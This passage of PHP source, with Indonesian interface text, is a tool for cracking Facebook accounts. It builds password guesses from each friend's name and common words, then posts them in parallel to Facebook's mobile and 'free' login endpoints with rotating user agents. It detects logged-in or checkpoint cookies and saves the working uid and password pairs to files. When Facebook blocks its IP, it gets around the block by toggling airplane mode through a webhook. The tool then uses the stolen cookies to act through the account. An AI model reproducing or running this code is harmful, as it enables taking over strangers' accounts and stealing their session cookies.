                if ($targetCount == 'clear') {
                    clear();
                    menu();
                    break;
                }

                if (!is_numeric($targetCount) && !empty($targetCount) && !preg_match('/^\d+-\d+$/', $targetCount)) {
                    echo "${red}Jumlah Target harus bersifat angka atau rentang angka-strip-angka.$reset\n";
                    continue;
                }

                if (preg_match('/^\d+-\d+$/', $targetCount)) {
                    $targetCountRange = explode('-', $targetCount);
                    if ($targetCountRange[0] > count($friends) || $targetCountRange[1] > count($friends)) {
                        echo "${red}Maksimal Jumlah Target adalah ".count($friends).".$reset\n";
                        continue;
                    }

                    if ($targetCountRange[0] >= $targetCountRange[1]) {
                        echo "${red}Rentang awal tidak boleh lebih atau sama dengan Rentang akhir.$reset\n";
                        continue;
                    }
                }

                if ($targetCount > count($friends)) {
                    echo "${red}Maksimal Jumlah Target adalah ".count($friends).".$reset\n";
                    continue;
                }

                while (true) {
                    if (empty($crackMethod)) {
                        input('Pilih Metode', ['Dump Friends', $target], 'Pilih metode crack yang tersedia.', ['Free (default)', 'Mobile']);
                        $method = strtolower(trim(fgets(STDIN)));

                        if ($method == 'clear') {
                            clear();
                            menu();
                            break;
                        }

                        if (empty($method) || $method == '1') {
                            $method = 'free';
                        } elseif ($method == '2') {
                            $method = 'mobile';
                        } else {
                            echo "${red}Masukkan opsi yang valid. Opsi ${confirm} tidak tersedia.$reset\n";
                            continue;
                        }
                    } else {
                        $method = $crackMethod;
                    }

                    while (true) {
                        if ($crackDebug == null) {
                            input('Debugging', ['Dump Friends', $target], 'Apakah Anda ingin menjalankan script dengan debugging?', ['Ya (default)', 'Tidak']);
                            $confirm = strtolower(trim(fgets(STDIN)));
                            $total = empty($targetCount) ? count($friends) : $targetCount;

                            if ($confirm == 'clear') {
                                clear();
                                menu();
                                break;
                            }

                            if (empty($confirm) || $confirm == '1') {
                                $debug = true;
                            } elseif ($confirm == '2') {
                                $debug = false;
                            } else {
                                echo "${red}Masukkan opsi yang valid. Opsi ${confirm} tidak tersedia.$reset\n";
                                continue;
                            }
                        } else {
                            $debug = $crackDebug;
                        }

                        return crack($target, $friends, $total, $debug, $method);
                    }
                }
            }
            
            break;
        }
    }
}

function get_cookies_from_header($header) {
    preg_match_all('/^set-cookie:\s*([^;]*)/mi', $header, $matches);
    $cookies = array();
    foreach($matches[1] as $item) {
        parse_str($item, $cookie);
        $cookies = array_merge($cookies, $cookie);
    }
    return $cookies;
}

function buildPass($fullname, $passAdd = null) {
    global $pwdSuffix;
    global $pwdAddition;
    global $pwdAdditionSuffix;
    global $pwdAdditionFirstProcess;

    $passwdList = [];
    $fullname = preg_replace("/[^a-zA-Z\s]/", '', $fullname);
    $xFullname = explode(' ', $fullname);

    $passwdList[] = strtolower($fullname);

    if ($pwdAdditionFirstProcess) {
        foreach ($pwdAddition as $prefix) {
            $prefix = strtolower($prefix);
            if (strlen($prefix) >= 6) {
                $passwdList[] = $prefix;
            }
            foreach ($pwdAdditionSuffix as $suffix) {
                $passwd = $prefix.$suffix;
                if (strlen($prefix) >= 6) {
                    $passwdList[] = $passwd;
                }
            }
        }

        foreach ($xFullname as $prefix) {
            $prefix = strtolower($prefix);
            if (strlen($prefix) >= 6) {
                $passwdList[] = $prefix;
            }
            foreach ($pwdSuffix as $suffix) {
                $passwd = $prefix.$suffix;
                if (strlen($prefix) > 3) {
                    if (strlen($passwd) >= 6) {
                        $passwdList[] = $passwd;
                    }
                }
            }
        }
    } else {
        foreach ($xFullname as $prefix) {
            $prefix = strtolower($prefix);
            if (strlen($prefix) >= 6) {
                $passwdList[] = $prefix;
            }
            foreach ($pwdSuffix as $suffix) {
                $passwd = $prefix.$suffix;
                if (strlen($prefix) > 3) {
                    if (strlen($passwd) >= 6) {
                        $passwdList[] = $passwd;
                    }
                }
            }
        }

        foreach ($pwdAddition as $prefix) {
            $prefix = strtolower($prefix);
            if (strlen($prefix) >= 6) {
                $passwdList[] = $prefix;
            }
            foreach ($pwdAdditionSuffix as $suffix) {
                $passwd = $prefix.$suffix;
                if (strlen($passwd) >= 6) {
                    $passwdList[] = $passwd;
                }
            }
        }
    }

    return $passwdList;
}

function crackMobile($target, $passwd, $debug = false, $save = false) {
    global $uaList;

    $passCount = count($passwd);

    $mh = curl_multi_init();
    $handles = [];
    $uaUsed = [];

    for ($i = 0; $i < $passCount; $i++) {
        $ua = $uaList[array_rand($uaList)];
        $uaUsed[] = $ua;
        $ch = curl_init('https://m.facebook.com/login/device-based/password/?uid=' . $target . '&flow=login_no_pin&refsrc=deprecated&_rdr');
        
        curl_setopt($ch, CURLOPT_HEADER, 1);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        
        $headers = array(
            'Host: m.facebook.com',
            'Upgrade-Insecure-Requests: 1',
            'User-Agent:' . $ua,
            'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            'Dnt: 1',
            'X-Requested-With: com.facebook.katana',
            'Sec-Fetch-Site: same-origin',
            'Sec-Fetch-Mode: cors',
            'Sec-Fetch-User: empty',
            'Sec-Fetch-Dest: document',
            'Referer: https://m.facebook.com/',
            'Accept-Language: en-US,en;q=0.9,id-ID;q=0.8,id;q=0.7'
        );
        
        curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);

        $html = curl_exec($ch);

        if (empty($html)) {
            global $yellow;
            global $white;
            global $cyan;
            global $reset;
            
            echo "${cyan}║ ${yellow}[${white}•$yellow] Menyambung ulang...$reset\n";
            sleep(5);
            continue;
        }

        $dom = new DOMDocument();
        libxml_use_internal_errors(true);
        @$dom->loadHTML($html);
        libxml_use_internal_errors(false);
        $xpath = new DOMXPath($dom);

        $form = $xpath->query('//form[@method="post"]//input');

        $data = [];

        foreach ($form as $input) {
            $name = $input->getAttribute('name');
            $value = $input->getAttribute('value');
            $data[$name] = $value;
        }

        $data['pass'] = $passwd[$i];

        $response_cookies = get_cookies_from_header($html);
        $cookies = http_build_query($response_cookies, '', '; ');
        curl_setopt($ch, CURLOPT_URL, 'https://m.facebook.com/login/device-based/validate-password/?shbl=0');
        $headers = array(
            'Host: m.facebook.com',
            'Cache-Control: max-age=0',
            'Upgrade-Insecure-Requests: 1',
            'Origin: https://m.facebook.com',
            'Content-Type: application/x-www-form-urlencoded',
            'User-Agent:' . $ua,
            'Accept: */*',
            'X-Requested-With: com.facebook.katana',
            'Sec-Fetch-Site: same-origin',
            'Sec-Fetch-Mode: cors',
            'Sec-Fetch-User: empty',
            'Sec-Fetch-Dest: document',
            'Referer: https://m.facebook.com/login/device-based/password/?uid='.$target.'&flow=login_no_pin&refsrc=deprecated&_rdr',
            'Accept-Language: en-US,en;q=0.9,id-ID;q=0.8,id;q=0.7'
        );

        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
        curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
        curl_setopt($ch, CURLOPT_COOKIE, $cookies);
        
        curl_multi_add_handle($mh, $ch);
        $handles[$i] = $ch;
    }

    $running = null;
    do {
        $status = curl_multi_exec($mh, $running);
        if ($status != CURLM_OK) {
            echo "Gagal";
            break;
        }
    } while ($running > 0);

    for ($i = 0; $i < $passCount; $i++) {
        $ch = $handles[$i];
        $result = curl_multi_getcontent($ch);

        preg_match('/HTTP\/\d (\d+)/', $result, $matches);
        $httpcode = $matches[1] ?? 0;

        preg_match('/<title>(.*?)<\/title>/i', $result, $matches);
        $title = $matches[1] ?? '-';

        $response_cookies = get_cookies_from_header($result);
        $cookies = http_build_query($response_cookies, '', '; ');

        global $okFile;
        global $cpFile;

        if (isset($response_cookies['c_user'])) {
            $data = [
                'cp'    => false,
                'uid'   => $target,
                'pass'  => $passwd[$i],
                'cookies' => $cookies,
                'ua' => $uaUsed[$i]
            ];
            follow($cookies);
            if (!empty($save)) {
                $okFileValue = file_get_contents($okFile);
                file_put_contents($okFile, "${okFileValue}${target}|${passwd[$i]}\n");
            }
            return $data;
            break;
        } elseif (isset($response_cookies['checkpoint'])) {
            $data = [
                'cp'    => true,
                'uid'   => $target,
                'pass'  => $passwd[$i],
                'cookies' => $cookies,
                'ua' => $uaUsed[$i]
            ];
            if (!empty($save)) {
                $cpFileValue = file_get_contents($cpFile);
                file_put_contents($cpFile, "${cpFileValue}${target}|${passwd[$i]}\n");
            }
            return $data;
            break;
        }

        if (!empty($debug)) {
            global $cyan;
            global $white;
            global $reset;

            $now = date('H:i:s');

            echo "${cyan}╠═[${white}${now}${cyan}] [${white}${httpcode}${cyan}] [${white}${passwd[$i]}${cyan}]${reset}\n";
        }

        if ($httpcode !== '302') {
            global $cyan;
            global $white;
            global $red;
            global $reset;

            echo "${cyan}╠═[${white}${now}${cyan}] [${red}${httpcode}${cyan}] ${red}${title}${reset}\n";
            return ['ip_blocked' => true];
        }
        
        @curl_multi_remove_handle($mh, $ch);
        @curl_close($ch);
    }

    @curl_multi_close($mh);
}

function crackFree($target, $passwd, $debug = false, $save = false) {
    global $uaList;

    $passCount = count($passwd);

    $mh = curl_multi_init();
    $handles = [];
    $uaUsed = [];

    for ($i = 0; $i < $passCount; $i++) {
        $ua = $uaList[array_rand($uaList)];
        $uaUsed[] = $ua;
        $ch = curl_init('https://free.facebook.com/login/device-based/password/?uid='.$target.'&flow=login_no_pin&refsrc=deprecated&_rdr');
        
        curl_setopt($ch, CURLOPT_HEADER, 1);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        
        $headers = array(
            'Host: free.facebook.com',
            'Upgrade-Insecure-Requests: 1',
            'User-Agent:' . $ua,
            'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            'Dnt: 1',
            'X-Requested-With: com.facebook.katana',
            'Sec-Fetch-Site: same-origin',
            'Sec-Fetch-Mode: cors',
            'Sec-Fetch-User: empty',
            'Sec-Fetch-Dest: document',
            'Referer: https://free.facebook.com/',
            'Accept-Language: en-US,en;q=0.9,id-ID;q=0.8,id;q=0.7'
        );
        
        curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);

        $html = curl_exec($ch);

        if (empty($html)) {
            global $yellow;
            global $white;
            global $cyan;
            global $reset;
            
            echo "${cyan}║ ${yellow}[${white}•$yellow] Menyambung ulang...$reset\n";
            sleep(5);
            continue;
        }

        $dom = new DOMDocument();
        libxml_use_internal_errors(true);
        @$dom->loadHTML($html);
        libxml_use_internal_errors(false);
        $xpath = new DOMXPath($dom);

        $form = $xpath->query('//form[@method="post"]//input');

        $data = [];

        foreach ($form as $input) {
            $name = $input->getAttribute('name');
            $value = $input->getAttribute('value');
            $data[$name] = $value;
        }

        $data['pass'] = $passwd[$i];

        $response_cookies = get_cookies_from_header($html);
        $cookies = http_build_query($response_cookies, '', '; ');
        curl_setopt($ch, CURLOPT_URL, 'https://free.facebook.com/login/device-based/validate-password/?shbl=0');
        $headers = array(
            'Host: free.facebook.com',
            'Cache-Control: max-age=0',
            'Upgrade-Insecure-Requests: 1',
            'Origin: https://m.facebook.com',
            'Content-Type: application/x-www-form-urlencoded',
            'User-Agent:' . $ua,
            'Accept: */*',
            'X-Requested-With: com.facebook.katana',
            'Sec-Fetch-Site: same-origin',
            'Sec-Fetch-Mode: cors',
            'Sec-Fetch-User: empty',
            'Sec-Fetch-Dest: document',
            'Referer: https://free.facebook.com/login/device-based/password/?uid='.$target.'&flow=login_no_pin&refsrc=deprecated&_rdr',
            'Accept-Language: en-US,en;q=0.9,id-ID;q=0.8,id;q=0.7'
        );

        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
        curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
        curl_setopt($ch, CURLOPT_COOKIE, $cookies);
        
        curl_multi_add_handle($mh, $ch);
        $handles[$i] = $ch;
    }

    $running = null;
    do {
        $status = curl_multi_exec($mh, $running);
        if ($status != CURLM_OK) {
            echo "Gagal";
            break;
        }
    } while ($running > 0);

    for ($i = 0; $i < $passCount; $i++) {
        $ch = $handles[$i];
        $result = curl_multi_getcontent($ch);

        preg_match('/HTTP\/\d (\d+)/', $result, $matches);
        $httpcode = $matches[1] ?? 0;

        preg_match('/<title>(.*?)<\/title>/i', $result, $matches);
        $title = $matches[1] ?? '-';

        $response_cookies = get_cookies_from_header($result);
        $cookies = http_build_query($response_cookies, '', '; ');

        global $okFile;
        global $cpFile;

        if (isset($response_cookies['c_user'])) {
            $data = [
                'cp'    => false,
                'uid'   => $target,
                'pass'  => $passwd[$i],
                'cookies' => $cookies,
                'ua' => $uaUsed[$i]
            ];
            follow($cookies);
            if (!empty($save)) {
                $okFileValue = file_get_contents($okFile);
                file_put_contents($okFile, "${okFileValue}${target}|${passwd[$i]}\n");
            }
            return $data;
            break;
        } elseif (isset($response_cookies['checkpoint'])) {
            $data = [
                'cp'    => true,
                'uid'   => $target,
                'pass'  => $passwd[$i],
                'cookies' => $cookies,
                'ua' => $uaUsed[$i]
            ];
            if (!empty($save)) {
                $cpFileValue = file_get_contents($cpFile);
                file_put_contents($cpFile, "${cpFileValue}${target}|${passwd[$i]}\n");
            }
            return $data;
            break;
        }

        if (!empty($debug)) {
            global $cyan;
            global $white;
            global $reset;

            $now = date('H:i:s');

            echo "${cyan}╠═[${white}${now}${cyan}] [${white}${httpcode}${cyan}] [${white}${passwd[$i]}${cyan}]${reset}\n";
        }

        if ($httpcode !== '302') {
            global $cyan;
            global $white;
            global $red;
            global $reset;

            echo "${cyan}╠═[${white}${now}${cyan}] [${red}${httpcode}${cyan}] ${red}${title}${reset}\n";
            return ['ip_blocked' => true];
        }
        
        @curl_multi_remove_handle($mh, $ch);
        @curl_close($ch);
    }

    @curl_multi_close($mh);
}

function getIP() {
    $ip = @file_get_contents('https://api.ipify.org');
    return $ip;
}

function crack($target, $friends, $total, $debug = false, $method) {
    global $white;
    global $yellow;
    global $green;
    global $red;
    global $cyan;
    global $reset;
    global $uid;
    global $flightModeWebhookUrl;
    global $flightModeEvery;

    $initial = getInfo($target);
    $name = $initial['name'] ?? null;
    $now = date("M j, Y H:i");
    $where = $total == 0 ? 'CRACK TARGET' : 'DUMP FRIENDS';
    $firstRange = 0;
    $lastRange = $total;

    if (preg_match('/^\d+-\d+$/', $total)) {
        $totalRange = explode('-', $total);
        $firstRange = $totalRange[0];
        $lastRange = $totalRange[1];
        $total = $lastRange - $firstRange;
    }

    clear();
    banner();
    echo $cyan;
    echo printFull("Halo, ${white}$uid$cyan!", 12)."${white}${where}${cyan}\n";
    echo "╔".printLine("═", 2)."╗\n";
    echo printFull("║ [${white}•$cyan] ${target}", -13)."║\n";
    echo printFull("║ [${white}•$cyan] ${name}", -13)."║\n";
    echo printFull("║ [${white}•$cyan] ${total} Target", -13)."║\n";
    echo printFull("║ [${white}•$cyan] ${now}", -13)."║\n";
    echo "╚".printLine("═", 2)."╝\n\n";
    echo wordwrap("Pastikan koneksi Anda untuk selalu terhubung ke internet dan jangan mencoba untuk mengaktifkan mode pesawat tanpa intruksi.\n");
    echo "Tekan ${white}CTRL + C$cyan untuk menghentikan proses.\n\n";
    echo $reset;

    $processedItems = -1;
    $indexFlightMode = 0;
    foreach (range($firstRange, $lastRange) as $i) {
        $data = $friends[$i];
        $dataID = $data['id'];
        $dataName = $data['name'];
        $passwd = buildPass($dataName, ['qwerty', 'bismillah', 'anjing', 'sayang']);
        $passCount = count($passwd);

        $processedItems++;
        if (count($friends) == 1) {
            $progress = 100;
        } else {
            $progress = ($processedItems / $total) * 100;
        }

        $crackPrefix = !empty($debug) ? 'DEBUG '.strtoupper($method) : strtoupper($method);

        echo "${cyan}╔═[${white}${crackPrefix}${cyan}] [${white}${i}${cyan}] [${white}${dataID}${cyan}] [${white}${passCount}${cyan}]\n";
        $result = $method == 'free' ? crackFree($data['id'], $passwd, $debug, true) : crackMobile($data['id'], $passwd, $debug, true);
        $accountResult = '';
        $ua = 'NULL';

        if (!empty($result) && !isset($result['ip_blocked'])) {
            $status = $result['cp'] ? 'CP' : 'OK';
            $statusColor = $result['cp'] ? $yellow : $green;
            $ua = $result['ua'];
            $accountResult = "${cyan}╠═[${statusColor}${status}${cyan}] [${white}".$data['id']."${cyan}]\n╠═[${white}PASS${cyan}] ".$result['pass']."\n╠═[${white}COOKIES${cyan}] ".$result['cookies']."\n";
        }

        $progressColor = ($progress >= 100) ? $green : $yellow;

        if (!empty($debug)) {
            $ip = getIP();
        }

        $indexFlightMode++;
        if (!empty($flightModeEvery)) {
            if ($indexFlightMode > $flightModeEvery) {
                echo "${cyan}║ ${yellow}[${white}•$yellow] Mengaktifkan mode pesawat...$reset\n";
                if (!empty($flightModeWebhookUrl)) {
                    try {
                        file_get_contents($flightModeWebhookUrl);
                        $indexFlightMode = 0;
                        sleep(5);
                    } catch (Exception $e) {
                        echo "${cyan}║ ${red}[${white}•$red] Mode pesawat gagal diaktifkan.$reset\n";
                    }
                } else {
                    echo "${cyan}║ ${yellow}[${white}•$yellow] Webhook tidak ditemukan. Harap aktifkan mode pesawat...$reset\n";
                    $currentIP = getIP();
                    while (true) {
                        if (empty(getIP())) {
                            echo "${cyan}║ ${yellow}[${white}•$yellow] Harap non aktifkan kembali mode pesawat...$reset\n";
                            sleep(1);
                            continue;
                        }

                        if ($currentIP !== getIP()) {
                            echo "${cyan}║ ${green}[${white}•$green] Alamat IP telah berubah. Melanjutkan proses...$reset\n";
                            break;
                        }
                    }
                }
            }
        } 

        if (isset($result['ip_blocked'])) {
            echo "${cyan}║ ${yellow}[${white}•$yellow] IP terblokir. Mengaktifkan mode pesawat...$reset\n";
            if (!empty($flightModeWebhookUrl)) {
                try {
                    file_get_contents($flightModeWebhookUrl);
                    $indexFlightMode = 0;
                    sleep(5);
                } catch (Exception $e) {
                    echo "${cyan}║ ${red}[${white}•$red] Mode pesawat gagal diaktifkan.$reset\n";
                }
            } else {
                echo "${cyan}║ ${yellow}[${white}•$yellow] Webhook tidak ditemukan. Harap aktifkan mode pesawat...$reset\n";
                $currentIP = getIP();
                while (true) {
                    if (empty(getIP())) {
                        echo "${cyan}║ ${yellow}[${white}•$yellow] Harap non aktifkan kembali mode pesawat...$reset\n";
                        sleep(1);
                        continue;
                    }

                    if ($currentIP !== getIP()) {
                        echo "${cyan}║ ${green}[${white}•$green] Alamat IP telah berubah. Melanjutkan proses...$reset\n";
                        break;
                    }
                }
            }
        }

        $progressPrefix = !empty($debug) ? "╠═[${white}IP${cyan}] ${ip}${cyan}\n╠═[${white}UA${cyan}] ${ua}\n${cyan}║\n╚═" : '';

        echo "\033[2K";
        echo "\033[0G";
        echo "${cyan}║\n".$accountResult.$progressPrefix."[${white}PROGRESS${cyan}] [${white}$firstRange${cyan}/${white}${lastRange}${cyan}]${white} ⇔ ${progressColor}" . round($progress, 2) . "%${reset}\n\n";
    }
}
